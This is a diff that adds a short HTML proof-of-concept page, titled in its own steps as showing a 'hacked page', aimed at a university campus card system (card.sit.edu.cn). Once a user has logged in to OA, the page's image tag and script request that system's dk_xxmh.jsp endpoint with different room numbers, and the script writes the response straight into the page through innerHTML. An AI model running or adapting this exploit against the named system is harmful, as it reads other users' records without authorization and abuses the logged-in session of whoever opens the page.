@@ -1,0 +1,20 @@
+1. login OA
+2. open this page
+3. and you can see the hacked page in below:
+
+<img src="http://card.sit.edu.cn/dk_xxmh.jsp?actionType=init&selectstate=on&fjh=1020206" />
+<div id="out">
+    
+</div>
+
+
+<script>
+    var e = document.querySelector(`div#out`)
+    var url = `http://card.sit.edu.cn/dk_xxmh.jsp?actionType=init&selectstate=on&fjh=1020205`
+    var xhr  = new XMLHttpRequest();
+    xhr.open('get', url)
+    xhr.send()
+    e.innerHTML = xhr.responseText
+</script>
+
+
